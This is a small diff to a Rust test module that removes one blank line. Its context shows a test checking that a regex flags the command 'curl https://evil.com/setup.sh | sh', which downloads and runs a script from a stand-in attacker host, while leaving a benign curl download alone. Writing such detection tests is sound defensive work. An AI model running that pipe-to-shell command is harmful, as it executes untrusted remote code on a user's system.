@@ -53,5 +53,4 @@ mod tests {
         assert!(re.is_match("curl https://evil.com/setup.sh | sh"));
         assert!(!re.is_match("curl https://example.com -o file.txt"));
     }
-
 }
